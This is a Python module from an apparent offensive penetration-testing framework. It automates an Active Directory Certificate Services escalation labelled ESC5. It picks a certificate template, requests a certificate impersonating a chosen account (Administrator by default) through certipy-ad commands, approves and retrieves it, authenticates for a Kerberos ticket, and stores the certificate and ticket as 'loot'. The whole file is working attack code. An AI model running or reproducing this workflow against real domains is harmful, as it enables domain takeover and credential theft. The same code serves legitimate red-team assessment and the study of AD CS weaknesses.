import os
import re
from core.helpers import run_command, save_loot, load_json_loot
from core.colors import blue, green, yellow, red

def abuse_esc5(session):
    print(blue("[*] Starting ESC5 abuse via SubCA template (manual approval flow)"), flush=True)
    print(yellow("[!] Certipy does not detect ESC5 automatically."), flush=True)
    print(yellow("[!] Look for: EnrolleeSuppliesSubject + RequiresApproval + ExportableKey"), flush=True)

    ca = session.adcs_metadata['cas'][0]
    ca_name = ca['name']

    templates = ca.get("templates")
    if not templates:
        print(yellow("[!] No templates found in session. Attempting fallback from loot..."), flush=True)
        templates = load_json_loot(session, template_fallback=True)
        if not templates:
            print(red("[-] No templates found. Run 'adcs enum' first."), flush=True)
            return

    print(blue("[*] Available certificate templates:\n"), flush=True)
    for i, tpl in enumerate(templates, 1):
        notes = []
        if "EnrolleeSuppliesSubject" in tpl.get("certificate_name_flag", ""):
            notes.append("SuppliesSubject")
        if tpl.get("requires_manager_approval"):
            notes.append("RequiresApproval")
        if "ExportableKey" in tpl.get("private_key_flag", ""):
            notes.append("ExportableKey")
        esc5_hint = f" ← Likely ESC5: {', '.join(notes)}" if notes else ""
        print(f"  [{i}] {tpl['name']}{esc5_hint}")

    try:
        choice = int(input("\nSelect template index: ").strip())
        template = templates[choice - 1]['name']
    except (ValueError, IndexError):
        print(red("[-] Invalid selection."), flush=True)
        return

    upn = input("[?] Enter UPN to impersonate (default: Administrator): ").strip() or "Administrator"
    target_ip = input("[?] Enter ADCS server IP (target-ip): ").strip()
    if not target_ip:
        print(red("[-] You must provide the ADCS server IP."), flush=True)
        return

    username = session.username
    domain = session.domain
    dc_ip = session.dc_ip
    password = session.password

    print(green(f"[+] Using CA: {ca_name}"))
    print(green(f"[+] Template: {template}"))
    print(green(f"[+] UPN: {upn}"))

    request_cmd = f"certipy-ad req -u {username} -p '{password}' -dc-ip {dc_ip} " \
                  f"-ns {dc_ip} -dns-tcp -target-ip {target_ip} -ca {ca_name} " \
                  f"-template {template} -upn {upn}"
    print(yellow(f"[>] Request Command: {request_cmd}\n Press Enter..."))
    out, err = run_command(request_cmd)
    print(out)
    if err: print(red(err))

    req_id_match = re.search(r"Request ID is (\d+)", out)
    if not req_id_match:
        print(red("[-] Could not extract Request ID."))
        return
    req_id = req_id_match.group(1)

    approve_cmd = f"certipy-ad ca -u {username} -p '{password}' -dc-ip {dc_ip} " \
                  f"-ns {dc_ip} -dns-tcp -target-ip {target_ip} -ca {ca_name} -issue-request {req_id}"
    print(yellow(f"[>] Approval Command: {approve_cmd}\n Press Enter..."))
    out, err = run_command(approve_cmd)
    print(out)
    if err: print(red(err))

    retrieve_cmd = f"certipy-ad req -u {username} -p '{password}' -dc-ip {dc_ip} " \
                   f"-ns {dc_ip} -dns-tcp -target-ip {target_ip} -ca {ca_name} -retrieve {req_id}"
    print(yellow(f"[>] Retrieve Command: {retrieve_cmd}\n Press Enter..."))
    out, err = run_command(retrieve_cmd)
    print(out)
    if err: print(red(err))

    pfx_match = re.search(r"Saving certificate and private key to '([^']+\\.pfx)'", out)
    pfx_file = pfx_match.group(1) if pfx_match else f"{upn.lower()}.pfx"

    if os.path.exists(pfx_file):
        with open(pfx_file, "rb") as f:
            content = f.read()
        save_loot(os.path.basename(pfx_file), content, binary=True)
        os.remove(pfx_file)
        print(green(f"[+] Moved and saved PFX to loot/{os.path.basename(pfx_file)}"))
    elif os.path.exists(os.path.join("loot", pfx_file)):
        print(green(f"[+] Certificate already saved in loot/{pfx_file}"))
    else:
        print(red("[-] PFX file not found after retrieval."))
        return


    auth_cmd = f"certipy-ad auth -pfx {pfx_file} -username {upn.lower()} " \
               f"-domain {domain} -dc-ip {dc_ip} -ns {dc_ip} -dns-tcp"
    print(yellow(f"[>] Auth Command: {auth_cmd}\n Press Enter..."))
    out, err = run_command(auth_cmd)
    print(out)
    if err: print(red(err))

    for line in out.splitlines():
        if line.strip().endswith(".ccache") and os.path.exists(line.strip()):
            with open(line.strip(), "rb") as f:
                save_loot(os.path.basename(line.strip()), f.read(), binary=True)
            print(green(f"[+] Saved TGT to loot/{line.strip()}"))
            break
    else:
        print(yellow("[!] No .ccache found, but hash may have been printed."))

    print(green("[✔] ESC5 abuse complete."))
